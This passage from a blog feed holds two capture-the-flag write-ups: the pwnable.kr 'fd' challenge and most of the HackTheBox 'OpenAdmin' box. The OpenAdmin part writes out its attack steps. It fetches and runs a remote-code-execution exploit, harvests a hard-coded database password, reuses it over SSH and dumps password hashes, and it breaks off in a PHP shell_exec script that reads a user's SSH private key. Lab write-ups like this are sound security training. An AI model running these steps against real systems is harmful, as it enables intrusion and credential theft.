class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>With the name of the challenge we can guess that is number will probably be a file descriptor. </p><p>Next we -almost- have a confirmation of this theory. <code>0x1234</code> (<code>4660</code>) gets subtracted to integer we passed as argument to get the actual file descriptor:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br></pre></td></tr></table></figure><p><em>Note: Here is a quick way to convert hexadecimal to decimal: <code>echo $((16#1234))</code></em></p><p>Then the <code>read</code> function is used to, well, read the file pointed by the file descriptor and store the content in the <code>buf</code> variable:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br></pre></td></tr></table></figure><p>The <code>buf</code> variable gets check to see if it contains the string <code>LETMEWIN\n</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br></pre></td></tr></table></figure><p>If it does, then the program print out the flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But you might wonder own the binary get print the flag since it’s owned by <code>root</code> ? It’s because the binary have the SUID bit set:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ls -l fd</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure><p>As a reminder:</p><blockquote><p>setuidis is a Unix access rights flag that allow users to run an executable with the permissions of the executable’s owner. They are often used to allow users to run programs with temporarily elevated privileges in order to perform a specific task. </p></blockquote><p>Thanks to this bit, the <code>fd</code> binary will run as with <code>root</code> privileges and will be allow to access the flag file.</p><p>Alright I think we now have all the needed informations to get the flag right ? To summarize:</p><ol><li>Create a file containing <code>LETMEWIN\n</code></li><li>Get the file descriptor of this file</li><li>Subtract <code>4660</code> from this file descriptor</li><li>Use this result as a command line argument: <code>./fd xxx</code></li></ol><p>Doesn’t look that scary. Let’s put it in practice now :) </p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>First, we create our file. Let’s use <code>printf</code> to make sure the newline gets included:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ <span class="built_in">printf</span> <span class="string">&quot;LETMEWIN\n&quot;</span> &gt; /tmp/.hg8</span><br><span class="line">fd@pwnable:~$ cat -e /tmp/.hg8</span><br><span class="line">LETMEWIN$</span><br></pre></td></tr></table></figure><p>Then we need to assign a file descriptor to our newly created file. It’s possible to do so using <code>exec X &lt; filename</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ <span class="built_in">exec</span> 10&lt;/tmp/.hg8</span><br></pre></td></tr></table></figure><p>Final step is to add <code>4660</code> to the file descriptor we chose and pass it as a argument to the <code>fd</code> binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4670</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h3 id="Method-2-Recommended"><a href="#Method-2-Recommended" class="headerlink" title="Method 2 (Recommended)"></a>Method 2 (Recommended)</h3><p>We also know that one of the most common file descriptor is <code>0</code> which correspond to the standard input. If we use <code>4660</code> as an argument, the binary will compare <code>LETMEWIN\n</code> to the content in the file descriptor <code>0</code> which is the standard input. If everything goes fine we should be able to directly write our “secret” code there. </p><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>We get a blank line with no error messages, let’s type <code>LETMEWIN</code> then enter:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h2 id="Exploitation-with-pwntools"><a href="#Exploitation-with-pwntools" class="headerlink" title="Exploitation with pwntools"></a>Exploitation with pwntools</h2><p>A simple challenge like this one is a good occasion to try our hand on <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> which can probably comes very useful in the future.</p><blockquote><p>Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p></blockquote><p>After installing the tool let’s create a simple script to solve the challenge. </p><p>First let’s connect to the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">&#x27;fd&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">2222</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Pop a shell and run <code>./fd</code> process with <code>4660</code> as argument, and then send the <code>LETMEIN</code> secret:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell = server.process([<span class="string">&#x27;./fd&#x27;</span>, <span class="built_in">str</span>(<span class="number">4660</span>)])</span><br><span class="line">shell.sendline(<span class="string">&#x27;LETMEWIN&#x27;</span>)</span><br></pre></td></tr></table></figure><p>After closing the connection and printing the result the final script looks like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">&#x27;fd&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">2222</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">shell = server.process([<span class="string">&#x27;./fd&#x27;</span>, <span class="built_in">str</span>(<span class="number">4660</span>)])</span><br><span class="line">shell.sendline(<span class="string">&#x27;LETMEWIN&#x27;</span>)</span><br><span class="line">result = shell.recvall()</span><br><span class="line">shell.close()</span><br><span class="line">server.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[*] fd@pwnable.kr:</span><br><span class="line">    Distro    Ubuntu 16.04</span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  4.4.179</span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process <span class="string">&#x27;./fd&#x27;</span> on pwnable.kr: pid 266951</span><br><span class="line">[+] Receiving all data: Done (62B)</span><br><span class="line">[*] Stopped remote process <span class="string">&#x27;fd&#x27;</span> on pwnable.kr (pid 266951)</span><br><span class="line">[*] Closed connection to <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwnable </category>
          
          <category> Toddler&#39;s Bottle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> fd </tag>
            
            <tag> file descriptor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - OpenAdmin</title>
      <link href="/posts/openadmin/"/>
      <url>/posts/openadmin/</url>
      
        <content type="html"><![CDATA[<img width="585" alt="openadmin-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158541-eef18000-9888-11ea-92ce-95a28fbd9c8d.png"><p>OpenAdmin just retired on HackTheBox. It’s an easy difficulty Linux based box, it need a bit of exploit, lot of recon, pivot and a bit GTFObins to finish, nice combo right? While this box is rated easy I wouldn’t recommend it for beginners since it require a lot a recon, it’s easy to miss important information and can be very frustrating if you are not used to it.</p><p><strong>Tl;Dr:</strong> To get the user flag you had to exploit a Remote Code Execution exploit on an outdated <code>opennetadmin</code> instance. You get a shell as <code>www-data</code> from which you pivot to the <code>jimmy</code> user after finding his password in a database config file. From <code>jimmy</code> account you pivot again to <code>joanna</code> account by extracting her ssh private key using a php script since the Apache web server is configured to run as user <code>joanna</code> and we have write rights over the <code>Document Root</code> folder. Finally as <code>joanna</code> we can get the user flag.<br>The root flag was a bit less tricky and needed you to execute a shell from inside a privileged <code>nano</code>  that <code>joanna</code> is allowed to run as <code>root</code> without password.</p><p>Alright, let’s get into it!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.171 openadmin.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC openadmin.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> openadmin.htb (10.10.10.171)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.03 seconds</span><br></pre></td></tr></table></figure><p>We have the “classic”: A web app running on port 80 and the SSH port 22 open.</p><p>Opening <code>http://openadmin.htb/</code> display the Apache2 Ubuntu default page:</p><p><img src="https://user-images.githubusercontent.com/9076747/73017278-cd731100-3e1f-11ea-9b01-c07b9d816af3.png" alt="Apache2 Ubuntu default page"></p><p>Nothing really interesting to see here… Let’s open  <code>gobuster</code> to see if he can find some juicy files and folders:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://openadmin.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/artwork (Status: 301)</span><br><span class="line">/music (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/sierra (Status: 301)</span><br></pre></td></tr></table></figure><p>Three uncommon folder here: </p><ul><li><p><code>artwork</code> and <code>sierra</code> are just static demo website, nothing to do on it. </p></li><li><p><code>music</code> looks like this:</p></li></ul><p><img src="https://user-images.githubusercontent.com/9076747/73017609-6efa6280-3e20-11ea-9f62-3d00bd0d24a9.png" alt="music website hackthebox"></p><p>Oddly enough the <code>Login</code> button redirect to an admin interface:</p><p><img src="https://user-images.githubusercontent.com/9076747/73017790-ac5ef000-3e20-11ea-9efa-0c4587673e66.png" alt="open admin page"></p><p>First thing that catch the eye is this big yellow message:</p><blockquote><p>You are NOT on the latest release version<br>Your version    = v18.1.1<br>Latest version = Unable to determine    </p><p>Please DOWNLOAD the latest version.</p></blockquote><p>We all know what outdated software means right :D </p><p>Selecting the “DOWNLOAD” link redirect to the software page which is called…. <code>OpenNetAdmin</code>. At first I though the name of the box would be related to a admin page being open and easily accessible but turn out it was more a reference to the software used.</p><p>We have the name of the software and it’s version (which is outdated). Let’s see if some already made exploits are available:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit opennetadmin</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                               |  Path</span><br><span class="line">                                                             | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits/php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits/php/webapps/47691.sh</span><br><span class="line">------------------------------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure><p>Bingo! Remote code execution on the exact version running here. Should be easy right?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://www.exploit-db.com/raw/47691 -o opennetadmin-rce.sh</span><br><span class="line">[hg8@archbook ~]$ bash exploit.sh http://openadmin.htb/ona/</span><br><span class="line">&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>We got a shell as <code>www-data</code>.</p><h3 id="Pivot-www-data-gt-jimmy"><a href="#Pivot-www-data-gt-jimmy" class="headerlink" title="Pivot www-data -&gt; jimmy"></a>Pivot www-data -&gt; jimmy</h3><p>Let’s start by enumerating users:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/$ ls -lh /home/</span><br><span class="line">total 8.0K</span><br><span class="line">drwxr-x--- 5 jimmy  jimmy  4.0K Jan 24 02:10 jimmy</span><br><span class="line">drwxr-x--- 6 joanna joanna 4.0K Nov 28 09:37 joanna</span><br></pre></td></tr></table></figure><p>Two users, we don’t have enough rights to access neither of their home folder. Let’s continue our enumerations.</p><p>One thing that often gives good results on web applications is searching for hard-coded password. A little grep can do that for us:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@openadmin:/$ grep -ri pass .</span><br><span class="line">[...]</span><br><span class="line">./<span class="built_in">local</span>/config/database_settings.inc.php: <span class="string">&#x27;db_passwd&#x27;</span> =&gt; <span class="string">&#x27;n1nj4W4rri0R!&#x27;</span>,</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Here is something interesting! The full config file is the following:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ona_contexts</span>=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;DEFAULT&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;databases&#x27;</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt;</span><br><span class="line">      <span class="keyword">array</span> (</span><br><span class="line">        <span class="string">&#x27;db_type&#x27;</span> =&gt; <span class="string">&#x27;mysqli&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_login&#x27;</span> =&gt; <span class="string">&#x27;ona_sys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_passwd&#x27;</span> =&gt; <span class="string">&#x27;n1nj4W4rri0R!&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_database&#x27;</span> =&gt; <span class="string">&#x27;ona_default&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_debug&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;description&#x27;</span> =&gt; <span class="string">&#x27;Default data context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;context_color&#x27;</span> =&gt; <span class="string">&#x27;#D3DBFF&#x27;</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>Let’s see if this password can work for either <code>jimmy</code> or <code>joanna</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh joanna@openadmin.htb</span><br><span class="line">joanna@openadmin.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">joanna@openadmin.htb&#x27;</span>s password:</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ ssh jimmy@openadmin.htb</span><br><span class="line">jimmy@openadmin.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Jan 24 01:52:49 2020 from 10.10.14.43</span></span><br><span class="line"><span class="string">jimmy@openadmin:~$ ls</span></span><br><span class="line"><span class="string">jimmy@openadmin:~$</span></span><br></pre></td></tr></table></figure><p>It works with <code>jimmy</code>! Unfortunately there is no user flags here, but at least we get a stable shell. </p><h3 id="Pivot-jimmy-gt-joanna"><a href="#Pivot-jimmy-gt-joanna" class="headerlink" title="Pivot jimmy -&gt; joanna"></a>Pivot jimmy -&gt; joanna</h3><p>Since we got database access I went to check if we could find juicy informations and potential other users password hash in the database:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:~$ mysql -u ona_sys -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| ona_default        |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; USE ona_default;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_ona_default  |</span><br><span class="line">+------------------------+</span><br><span class="line">| [...]                  |</span><br><span class="line">| users                  |</span><br><span class="line">| [...]                  |</span><br><span class="line">+------------------------+</span><br><span class="line">40 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">| id | username | password                         | level | ctime               | atime               |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-01-23 10:12:57 | 2020-01-23 10:12:57 |</span><br><span class="line">|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |</span><br><span class="line">+----+----------+----------------------------------+-------+---------------------+---------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>Two MD5 hash. Quick Google search shows that <code>098f6bcd4621d373cade4e832627b4f6</code> is hash for <code>test</code> and <code>21232f297a57a5a743894a0e4a801fc3</code> is hash for <code>admin</code>.</p><p>Too bad no hash for <code>joanna</code> here. Let’s move on to more recon.</p><p>While looking around (still using the awesome <code>grep</code>) we find some interesting config files mentioning <code>joanna</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/etc$ grep -ri <span class="string">&quot;joanna&quot;</span> . 2&gt;/dev/null</span><br><span class="line">./passwd-:joanna:x:1001:1001::/home/joanna:/bin/bash</span><br><span class="line">./apache2/sites-available/internal.conf:AssignUserID joanna joanna</span><br><span class="line">./sudoers.d/joanna:joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>The <code>sudoers.d</code> one look perfect for a privilege escalation don’t you think ? Let’s keep this in mind for later. The one that really catch my eye is the apache config. Let’s see the full file:</p><figure class="highlight apacheconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> <span class="number">127.0.0.1:52846</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost <span class="number">127.0.0.1:52846</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> internal.openadmin.htb</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/internal</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;IfModule mpm_itk_module&gt;</span></span><br><span class="line"><span class="attribute">AssignUserID</span> joanna joanna</span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>It was the first time I saw about the <code>AssignUserID</code> configuration. Even if we can easily understand that it’s meant to run the apache process for this virtualhost as <code>joanna</code> instead of <code>www-data</code> I searched on the documentation out of curiosity to learn more about this.</p><p>This configuration is available through the <a href="http://mpm-itk.sesse.net/"><code>apache2-mpm-itk</code></a> module: </p><blockquote><p><code>AssignUserID</code>: Takes two parameters, uid and gid (or<br> really, user name and group name; use “#<uid>” if you want to<br> specify a raw uid); specifies what uid and gid the<br> vhost will run as (after parsing the request etc., of course).</p></blockquote><p>So, the virtualhost for <code>/var/www/internal</code> document root runs as <code>joanna</code>. If we can find a Remote Code Execution command in the PHP code in this folder (by abusing an <code>eval</code> or uploading web shell for example), then we can run commands as <code>joanna</code> user. </p><p>To be honest, I missed this folder in my previous recons, so let’s see what’s inside now:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/$ ls -l /<span class="keyword">var</span>/www/</span><br><span class="line">drwxr-xr-x <span class="number">6</span> www-data www-data <span class="number">4096</span> Nov <span class="number">22</span> <span class="number">15</span>:<span class="number">59</span> html</span><br><span class="line">drwxrwx--- <span class="number">2</span> jimmy    internal <span class="number">4096</span> Jan <span class="number">24</span> <span class="number">03</span>:<span class="number">11</span> internal</span><br><span class="line">jimmy@openadmin:/<span class="keyword">var</span>/www/internal$ ls -l</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal <span class="number">3228</span> Jan <span class="number">24</span> <span class="number">03</span>:<span class="number">11</span> index.php</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal  <span class="number">185</span> Nov <span class="number">23</span> <span class="number">16</span>:<span class="number">37</span> logout.php</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> jimmy internal  <span class="number">339</span> Nov <span class="number">23</span> <span class="number">17</span>:<span class="number">40</span> main.php</span><br></pre></td></tr></table></figure><p>Here is something interesting… The <code>internal</code> folder is owned by our current <code>jimmy</code>, meaning we can write anything we want in this folder. I will use use the <code>shell_exec()</code> php function to try to retrieve <code>joanna</code> ssh private key.</p><p>Here is one way to do it:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;cat /home/joanna/.ssh/id_rsa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 